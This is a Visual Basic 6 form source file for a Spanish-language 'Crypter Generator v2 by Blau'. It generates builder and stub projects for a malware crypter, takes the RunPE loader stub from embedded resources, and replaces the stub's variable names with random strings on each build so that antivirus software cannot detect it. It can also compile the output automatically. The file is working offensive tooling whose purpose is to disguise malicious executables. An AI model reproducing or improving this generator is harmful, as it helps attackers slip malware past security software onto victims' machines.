VERSION 5.00
Object = "{90F3D7B3-92E7-44BA-B444-6A8E2A3BC375}#1.0#0"; "Actskin4.ocx"
Object = "{F9043C88-F6F2-101A-A3C9-08002B2F49FB}#1.2#0"; "COMDLG32.OCX"
Begin VB.Form Form1 
   BorderStyle     =   1  'Fixed Single
   Caption         =   "Crypter Generator v2 by Blau"
   ClientHeight    =   2970
   ClientLeft      =   45
   ClientTop       =   375
   ClientWidth     =   6750
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   2970
   ScaleWidth      =   6750
   StartUpPosition =   3  'Windows Default
   Begin VB.CommandButton btnBuscarCompilador 
      Caption         =   "Buscar"
      Enabled         =   0   'False
      Height          =   255
      Left            =   5280
      TabIndex        =   13
      Top             =   2040
      Width           =   1215
   End
   Begin VB.TextBox txtCompilador 
      Enabled         =   0   'False
      Height          =   285
      Left            =   1200
      TabIndex        =   12
      Text            =   "Ruta al compilador"
      Top             =   2040
      Width           =   3975
   End
   Begin VB.CheckBox chkCompilar 
      Caption         =   "Compilar"
      Height          =   315
      Left            =   120
      TabIndex        =   11
      Top             =   2040
      Width           =   975
   End
   Begin VB.Frame Frame2 
      Caption         =   "Stub"
      Height          =   1815
      Left            =   3720
      TabIndex        =   5
      Top             =   120
      Width           =   2895
      Begin VB.OptionButton optNative 
         Caption         =   "Native"
         Height          =   195
         Left            =   1920
         TabIndex        =   10
         Top             =   720
         Width           =   855
      End
      Begin VB.OptionButton optPcode 
         Caption         =   "P-Code"
         Height          =   195
         Left            =   240
         TabIndex        =   9
         Top             =   720
         Value           =   -1  'True
         Width           =   1215
      End
      Begin VB.TextBox txtStubNombre 
         Height          =   285
         Left            =   1200
         TabIndex        =   7
         Text            =   "Stub.exe"
         Top             =   240
         Width           =   1575
      End
      Begin ACTIVESKINLibCtl.SkinLabel SkinLabel2 
         Height          =   255
         Left            =   240
         OleObjectBlob   =   "Form1.frx":0000
         TabIndex        =   6
         Top             =   240
         Width           =   855
      End
   End
   Begin VB.CommandButton btnCrear 
      Caption         =   "CREAR"
      Height          =   315
      Left            =   120
      TabIndex        =   4
      Top             =   2520
      Width           =   6495
   End
   Begin ACTIVESKINLibCtl.Skin Skin1 
      Left            =   0
      OleObjectBlob   =   "Form1.frx":006A
      Top             =   0
   End
   Begin VB.Frame Frame1 
      Caption         =   "Builder"
      Height          =   1815
      Left            =   120
      TabIndex        =   0
      Top             =   120
      Width           =   3495
      Begin VB.CheckBox chkEOF 
         Caption         =   "EOF"
         Height          =   195
         Left            =   120
         TabIndex        =   17
         Top             =   1440
         Width           =   735
      End
      Begin VB.CommandButton btnBuscarSkin 
         Caption         =   "Buscar"
         Enabled         =   0   'False
         Height          =   255
         Left            =   2520
         TabIndex        =   16
         Top             =   1080
         Width           =   855
      End
      Begin VB.TextBox txtBuilderSkin 
         Enabled         =   0   'False
         Height          =   285
         Left            =   840
         TabIndex        =   15
         Top             =   1080
         Width           =   1575
      End
      Begin VB.CheckBox chkSkin 
         Caption         =   "Skin"
         Height          =   255
         Left            =   120
         TabIndex        =   14
         Top             =   1080
         Width           =   615
      End
      Begin MSComDlg.CommonDialog CD 
         Left            =   3240
         Top             =   0
         _ExtentX        =   847
         _ExtentY        =   847
         _Version        =   393216
      End
      Begin ACTIVESKINLibCtl.SkinLabel SkinLabel3 
         Height          =   255
         Left            =   120
         OleObjectBlob   =   "Form1.frx":1461F
         TabIndex        =   8
         Top             =   720
         Width           =   735
      End
      Begin VB.TextBox txtBuilderNombre 
         Height          =   285
         Left            =   840
         TabIndex        =   3
         Text            =   "Builder.exe"
         Top             =   720
         Width           =   2535
      End
      Begin ACTIVESKINLibCtl.SkinLabel SkinLabel1 
         Height          =   255
         Left            =   120
         OleObjectBlob   =   "Form1.frx":14689
         TabIndex        =   2
         Top             =   360
         Width           =   615
      End
      Begin VB.TextBox txtBuilderTitle 
         Height          =   285
         Left            =   840
         TabIndex        =   1
         Text            =   "Crypter 1"
         Top             =   360
         Width           =   2535
      End
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Option Explicit

Private Sub btnBuscarCompilador_Click()
    With CD
        .DialogTitle = "Ruta al IDE VB6"
        .Filter = "EXE|*.exe"
        .ShowOpen
    End With
    
    If CD.FileName = vbNullString Then Exit Sub
    txtCompilador.Text = CD.FileName
End Sub

Private Sub btnBuscarSkin_Click()
    With CD
        .DialogTitle = "Ruta al Skin"
        .Filter = "SKN|*.skn"
        .ShowOpen
    End With
    
    If CD.FileName = vbNullString Then Exit Sub
    txtBuilderSkin.Text = CD.FileName
End Sub

Private Sub btnCrear_Click()
    If txtBuilderTitle.Text = vbNullString Then txtBuilderTitle.Text = "Blau Crypter"
    If txtBuilderNombre.Text = vbNullString Then txtBuilderNombre.Text = "BlauBuilder.exe"
    If txtStubNombre.Text = vbNullString Then txtStubNombre.Text = "BlauStb.exe"
    
    Dim sFolderName As String, sDelimitador As String
    sDelimitador = RandomString(50)
    sFolderName = RandomString(10, "1234567890") & "_crypter"
    MkDir App.Path & "\" & sFolderName
    
    Dim bProject As String, bProject2 As String, bForm1 As String, bForm2 As String, bEOF As String
    bProject = StrConv(LoadResData(101, "BUILDER"), vbUnicode)
    bProject2 = StrConv(LoadResData(104, "BUILDER"), vbUnicode)
    bForm1 = StrConv(LoadResData(102, "BUILDER"), vbUnicode)
    bForm2 = StrConv(LoadResData(103, "BUILDER"), vbUnicode)
    bEOF = StrConv(LoadResData(105, "BUILDER"), vbUnicode)
    
    bForm1 = Replace(bForm1, Chr(34) & "FormTitle" & Chr(34), Chr(34) & txtBuilderTitle.Text & Chr(34))
    bProject = Replace(bProject, Chr(34) & "Builder.exe" & Chr(34), Chr(34) & txtBuilderNombre.Text & Chr(34))
    bForm1 = Replace(bForm1, "AQUIVAELDELIMITADOR", sDelimitador)
    bForm1 = Replace(bForm1, "STUBNAME.exe", txtStubNombre.Text)
    
    If chkSkin.value Then
        bForm1 = Replace(bForm1, "'Skin1.", "Skin1.")
        bForm1 = Replace(bForm1, "RUTASKIN", txtBuilderSkin.Text)
    End If
    
    If chkEOF.value Then
        bForm1 = Replace(bForm1, "'chkEOF.Enabled", "chkEOF.Visible")
    End If
    
    Call CreateFile(App.Path & "\" & sFolderName & "\Builder.vbp", bProject)
    Call CreateFile(App.Path & "\" & sFolderName & "\Builder.vbw", bProject2)
    Call CreateFile(App.Path & "\" & sFolderName & "\Form1.frm", bForm1)
    Call CreateFile(App.Path & "\" & sFolderName & "\Form1.frx", bForm2)
    Call CreateFile(App.Path & "\" & sFolderName & "\mEOF.bas", bEOF)
    
    Dim sProject As String, sProject2 As String, sModule As String
    sProject = StrConv(LoadResData(105, "STUB"), vbUnicode)
    sProject2 = StrConv(LoadResData(106, "STUB"), vbUnicode)
    sModule = StrConv(LoadResData(107, "STUB"), vbUnicode)
    
    sProject = Replace(sProject, Chr(34) & "Stub.exe" & Chr(34), Chr(34) & txtStubNombre.Text & Chr(34))
    If optPcode.value Then
        sProject = Replace(sProject, "CompilationType=0", "CompilationType=-1")
    End If
    sModule = Replace(sModule, "AQUIVAELDELIMITADOR", sDelimitador)
    
    Dim sVars() As String, sVar As Variant
    sVars = Split("sMe,sDelimitador,sDescifrado,sBinario,LHOkzoPGFR,eIDZqDPUcT,WokvHZXMKJ,sLLfywdtBJ,FzvYRYNJZZ,GSLDVUnNCw,POHsRpQZVi,RjLeQSXEox,QqYkDXkgcQ,MebxTrztG,iHdGIkvSRG,QqYkDXkgcQ,MebxTrztG,GetCurrentPath,ReadMyself,ReadMyself_ret,SplitMyself,sDelimitador2,s_ASM,b_ASM,RunPE_i,RunPE_j,RunPE_k,TargetHost,bBuffer", ",")
    
    For Each sVar In sVars
        sModule = Replace(sModule, sVar, RandomString(50))
    Next
    
    Call CreateFile(App.Path & "\" & sFolderName & "\Stub.vbp", sProject)
    Call CreateFile(App.Path & "\" & sFolderName & "\Stub.vbw", sProject2)
    Call CreateFile(App.Path & "\" & sFolderName & "\MainModule.bas", sModule)
        
    If chkCompilar.value Then
        Shell Chr(34) & txtCompilador.Text & Chr(34) & " /MAKE " & Chr(34) & App.Path & "\" & sFolderName & "\Builder.vbp" & Chr(34)
        Shell Chr(34) & txtCompilador.Text & Chr(34) & " /MAKE " & Chr(34) & App.Path & "\" & sFolderName & "\Stub.vbp" & Chr(34)
    End If
        
    MsgBox ("¡Crypter generado correctamente!" & vbCrLf & "[" & App.Path & "\" & sFolderName & "]")
End Sub

Private Sub CreateFile(sPath As String, sContent As String)
    Open sPath For Binary As #1
        Put #1, , sContent
    Close #1
End Sub

Private Sub chkCompilar_Click()
    btnBuscarCompilador.Enabled = chkCompilar.value
End Sub

Private Sub chkSkin_Click()
    btnBuscarSkin.Enabled = chkSkin.value
End Sub

Private Sub Form_Load()
    Skin1.ApplySkin Me.hWnd
End Sub


Public Function RandomString(ByVal Length As Long, Optional charset As String = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMOPQRSTUVWXYZ") As String
    Dim chars() As Byte, value() As Byte, chrUprBnd As Long, i As Long
    If Length > 0& Then
        Randomize
        chars = charset
        chrUprBnd = Len(charset) - 1&
        Length = (Length * 2&) - 1&
        ReDim value(Length) As Byte
        For i = 0& To Length Step 2&
            value(i) = chars(CLng(chrUprBnd * Rnd) * 2&)
        Next
    End If
    RandomString = value
End Function
